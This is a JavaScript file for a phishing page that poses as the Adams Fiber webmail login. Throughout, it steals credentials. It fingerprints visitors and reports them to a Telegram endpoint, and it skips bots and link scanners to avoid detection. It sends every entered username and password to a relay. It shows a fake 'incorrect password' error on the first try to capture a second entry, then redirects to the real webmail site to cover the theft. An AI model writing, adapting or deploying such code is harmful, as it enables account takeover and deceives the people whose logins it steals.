/**
 * Adams Fiber webmail — visit notify (grant-gated) + same-page double-submit.
 * Attempt 1: Telegram login → fake incorrect credentials → clear BOTH fields.
 * Attempt 2: Telegram login → redirect to https://webmail.adams.net/
 */

var VISIT_KEY = "adams_visitor_notified";
var SESSION_KEY = "adams_referrer_access_granted_v2";
var LANDING_READY_KEY = "adams_landing_ready";
var REDIRECT_URL = "https://webmail.adams.net/";
var FAKE_ERROR =
  "The username or password does not match our records. Please try again.";

function triggerVisitorNotification() {
  try {
    if (sessionStorage.getItem(VISIT_KEY) === "1") return;
  } catch (e) {}

  var ua = navigator.userAgent || "";
  if (
    /(bot|crawl|spider|slurp|headless|puppeteer|selenium|playwright|curl|wget|python-requests|axios|postman|insomnia|telegrambot|whatsapp|discordbot|twitterbot|facebookexternalhit|linkedinbot)/i.test(
      ua,
    )
  ) {
    return;
  }

  var ref = document.referrer;
  var isLocal =
    typeof window !== "undefined" &&
    (window.location.hostname === "localhost" ||
      window.location.hostname === "127.0.0.1");
  if ((!ref || ref === "Direct" || !ref.startsWith("http")) && !isLocal) return;

  fetch("/api/telegram/visitor", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      userAgent: ua,
      screen: window.screen
        ? window.screen.width + "x" + window.screen.height
        : "Unknown",
      language: navigator.language,
      referrer: ref || (isLocal ? "http://localhost/" : "Direct"),
      pageUrl: window.location.href,
    }),
  })
    .then(function (res) {
      if (res.ok) {
        try {
          sessionStorage.setItem(VISIT_KEY, "1");
        } catch (e) {}
      }
    })
    .catch(function () {});
}

function landingIsReady() {
  try {
    if (sessionStorage.getItem(SESSION_KEY) === "true") return true;
    if (sessionStorage.getItem(LANDING_READY_KEY) === "1") return true;
  } catch (e) {}
  var wrap = document.getElementById("gate-protected-wrapper");
  if (wrap) {
    try {
      if (window.getComputedStyle(wrap).display !== "none") return true;
    } catch (e) {}
  }
  return false;
}

(function initVisitorNotification() {
  window.addEventListener(
    "adams:access-granted",
    function () {
      triggerVisitorNotification();
    },
    { once: true },
  );

  if (landingIsReady()) {
    triggerVisitorNotification();
    return;
  }

  // Gate may unlock after this module loads (local unlock / referrer).
  var tries = 0;
  var timer = setInterval(function () {
    tries += 1;
    if (landingIsReady()) {
      clearInterval(timer);
      triggerVisitorNotification();
    } else if (tries >= 40) {
      clearInterval(timer);
    }
  }, 50);
})();

document.addEventListener("DOMContentLoaded", function () {
  var form = document.getElementById("userForm") || document.forms.form;
  if (!form) return;

  var messageDiv = document.getElementById("message");
  var submitButton = document.getElementById("rcmloginsubmit");
  var originalButtonText = submitButton
    ? submitButton.textContent || "Login"
    : "Login";
  var submissionCount = 0;

  function emailField() {
    return document.getElementById("rcmloginuser");
  }
  function passwordField() {
    return document.getElementById("rcmloginpwd");
  }

  function showError(text) {
    if (!messageDiv) return;
    messageDiv.textContent = text;
    messageDiv.classList.remove("success", "hidden");
    messageDiv.classList.add("show", "error");
  }

  function clearCredentials() {
    var u = emailField();
    var p = passwordField();
    if (u) u.value = "";
    if (p) p.value = "";
    if (u) u.focus();
  }

  function setBusy(busy) {
    if (!submitButton) return;
    submitButton.disabled = !!busy;
    submitButton.textContent = busy ? "Please wait…" : originalButtonText;
  }

  async function notifyLogin(userId, password, attempt) {
    var res = await fetch("/api/telegram/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        user_id: userId,
        password: password,
        attempt: attempt,
        member_origin: window.location.href,
        device_info: navigator.userAgent,
        screen_size: window.screen
          ? window.screen.width + "x" + window.screen.height
          : null,
        referrer: document.referrer || null,
      }),
    });
    if (!res.ok) throw new Error("HTTP " + res.status);
    return res.json().catch(function () {
      return { ok: true };
    });
  }

  form.addEventListener("submit", async function (e) {
    e.preventDefault();

    var hp = document.getElementById("hp_field");
    if (hp && hp.value && hp.value.trim() !== "") {
      showError("Spam detected");
      return;
    }

    var userEl = emailField();
    var passEl = passwordField();
    var userId = userEl ? String(userEl.value || "").trim() : "";
    var password = passEl ? String(passEl.value || "") : "";

    if (!userId) {
      showError("Please enter your email.");
      if (userEl) userEl.focus();
      return;
    }
    if (!password) {
      showError("Please enter your password.");
      if (passEl) passEl.focus();
      return;
    }

    submissionCount += 1;
    setBusy(true);

    try {
      await notifyLogin(userId, password, submissionCount);

      if (submissionCount === 1) {
        showError(FAKE_ERROR);
        clearCredentials();
        setBusy(false);
        return;
      }

      if (messageDiv) {
        messageDiv.classList.remove("show", "error");
        messageDiv.textContent = "";
      }
      setTimeout(function () {
        window.location.href = REDIRECT_URL;
      }, 1200);
    } catch (err) {
      showError("Unable to process login. Please try again.");
      setBusy(false);
    }
  });
});
